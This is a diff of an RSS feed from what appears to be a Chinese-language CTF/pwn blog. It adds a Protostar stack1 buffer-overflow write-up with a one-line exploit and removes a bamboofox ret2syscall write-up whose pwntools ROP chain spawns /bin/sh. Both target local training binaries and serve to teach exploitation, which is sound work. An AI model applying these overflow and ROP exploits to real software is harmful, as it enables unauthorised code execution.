@@ -4,7 +4,7 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Sun, 23 Jul 2023 15:11:32 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 07 Nov 2023 09:21:41 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
@@ -122,6 +122,43 @@ blacklist=(<span class="hljs-string">"Executable script"</span> <span class="hlj
 <p>本地开启对应端口监听</p>
 <p><img src="/_resources/31c2610f5fc9440dab84e5cb190b4de0.png" /></p>
 <p>成功获得反弹shell及root flag</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Protostar_stack1]]></title>
+            <guid>b2a0541272674f9a85cb687e10dee991</guid>
+            <pubDate>Mon, 26 Jun 2023 03:09:04 GMT</pubDate>
+            <content:encoded><![CDATA[<p>运行程序，如下</p>
+<p><img src="/_resources/f85f202179ae44f69346935c496b976c.png" /></p>
+<p><strong>checksec</strong></p>
+<p><strong><img src="/_resources/b4c88f613ad64522ad48fe23cd941c77.png" alt="d3ae0530430fd8b497a72ade0e9fa2a2.png" width="430" height="218" class="jop-noMdConv" /></strong></p>
+<p>查看反编译代码</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span>
+</span>{
+    undefined auStack84 [<span class="hljs-number">64</span>];
+    <span class="hljs-type">int32_t</span> iStack20;
+    
+    <span class="hljs-keyword">if</span> (argv == (<span class="hljs-type">char</span> **)<span class="hljs-number">0x1</span>) {
+        <span class="hljs-built_in">errx</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"please specify an argument\n"</span>);
+    }
+    iStack20 = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">strcpy</span>(auStack84, envp[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">if</span> (iStack20 == <span class="hljs-number">0x61626364</span>) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"you have correctly got the variable to the right value"</span>);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Try again, you got 0x%08x\n"</span>, iStack20);
+    }
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>本题目相较于stack0,增加一个检测<code>(iStack20 == 0x61626364)</code></p>
+<p><strong>exp如下：</strong></p>
+<p><strong>(0x61626364即abcd,要以小端序格式输入，adba --&gt; \x64\x63\x62\x61)</strong></p>
+<p><code>./stack1 `python -c "print('A'*64+'\x64\x63\x62\x61')"`</code></p>
+<img src="/_resources/b6b929337ca84100af479f73a1acd162.png" alt="c5a4931b42cb39cab0893683b1ca473b.png" width="473" height="40" class="jop-noMdConv" />
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
 ]]></content:encoded>
         </item>
         <item>
@@ -1412,118 +1449,6 @@ buf2_addr = <span class="hljs-number">0x804a080</span>
 
 sh.sendline(shellcode + <span class="hljs-string">b'a'</span>*<span class="hljs-number">68</span> + p32(buf2_addr))
 sh.interactive()</code></pre></div>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[bamboofox-ret2syscall-rop]]></title>
-            <guid>7c1b032bd2b9439590fb3407fb4a70cd</guid>
-            <pubDate>Mon, 10 Oct 2022 03:20:22 GMT</pubDate>
-            <content:encoded><![CDATA[<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-
-<span class="hljs-type">char</span> *shell = <span class="hljs-string">"/bin/sh"</span>;
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
-{
-    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);
-    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);
-    
-    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];
-
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"This time, no system() and NO SHELLCODE!!!\n"</span>);
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"What do you plan to do?\n"</span>);
-    gets(buf);
-
-    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-}</code></pre></div>
-<p>检查保护</p>
-<p>可以看到开启了NX（不可执行）保护</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># checksec rop    </span>
-[*] <span class="hljs-string">'/root/pwn/rop'</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre></div>
-<p>查看源码</p>
-<p><img src="/_resources/d764884b35f94a3ea48083664a31d948.png" /></p>
-<p>由于开启了NX保护，无法将shellcode部署到内存中，故而尝试调用系统函数获得shell</p>
-<p>尝试通过溢出调用执行<code>execve("/bin/sh",NULL,NULL)</code>获得shell</p>
-<p><code>execve("/bin/sh",NULL,NULL)</code>的指令如下</p>
-<div><pre class="hljs"><code><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0xb</span>
-
-<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, [“/bin/sh”]
-
-<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0</span>
-
-<span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
-
-<span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span></code></pre></div>
-<p><strong>x86 通过 int 0x80 指令进行系统调用</strong></p>
-<p><strong>amd64 通过 syscall 指令进行系统调用</strong></p>
-<p>这里使用ropgadget寻找合适的片段</p>
-<p>首先查找eax</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># ROPgadget --binary rop --only='pop|ret' |grep 'eax'</span>
-0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
-0x080bb196 : pop eax ; ret
-0x0807217a : pop eax ; ret 0x80e
-0x0804f704 : pop eax ; ret 3
-0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</code></pre></div>
-<p>这里选择 <code>0x080bb196 : pop eax ; ret</code></p>
-<p>接下来寻找ebx,ecx,edx</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># ROPgadget --binary rop --only='pop|ret' |grep 'ebx'</span>
-0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
-0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
-0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
-0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
-0x080be23f : pop ebx ; pop edi ; ret
-0x0806eb69 : pop ebx ; pop edx ; ret
-0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
-0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
-0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
-0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
-0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
-0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
-0x08048913 : pop ebx ; pop esi ; pop edi ; ret
-0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
-0x08049a94 : pop ebx ; pop esi ; ret
-0x080481c9 : pop ebx ; ret
-0x080d7d3c : pop ebx ; ret 0x6f9
-0x08099c87 : pop ebx ; ret 8
-0x0806eb91 : pop ecx ; pop ebx ; ret
-0x0806336b : pop edi ; pop esi ; pop ebx ; ret
-0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
-0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
-0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
-0x0805c820 : pop esi ; pop ebx ; ret
-0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x0807b6ed : pop ss ; pop ebx ; ret</code></pre></div>
-<p>这里选择<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code> ，可以一次性控制ebx,ecx,edx三个寄存器</p>
-<p>接下来寻找/bin/sh字段</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># ROPgadget --binary rop --string='/bin/sh'           </span>
-Strings information
-============================================================
-0x080be408 : /bin/sh</code></pre></div>
-<p>最后寻找中断指令int 0x80</p>
-<div><pre class="hljs"><code>└─<span class="hljs-comment"># ROPgadget --binary rop --only='int'     </span>
-Gadgets information
-============================================================
-0x08049421 : int 0x80</code></pre></div>
-<p>所以总的就是</p>
-<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-
-sh = process(<span class="hljs-string">'./rop'</span>)
-
-pop_eax_ret = <span class="hljs-number">0x080bb196</span>
-pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span>
-int_0x80 = <span class="hljs-number">0x08049421</span>
-bin_sh = <span class="hljs-number">0x80be408</span>
-payload = flat([<span class="hljs-string">b'a'</span> * <span class="hljs-number">0x70</span>,  pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bin_sh, int_0x80])
-sh.sendline(payload)
-sh.interactive()</code></pre></div>
-<p>执行结果如下所示</p>
-<p><img src="/_resources/77edbc781ba0423a9a7eb1202e55b95e.png" /></p>
 ]]></content:encoded>
         </item>
     </channel>
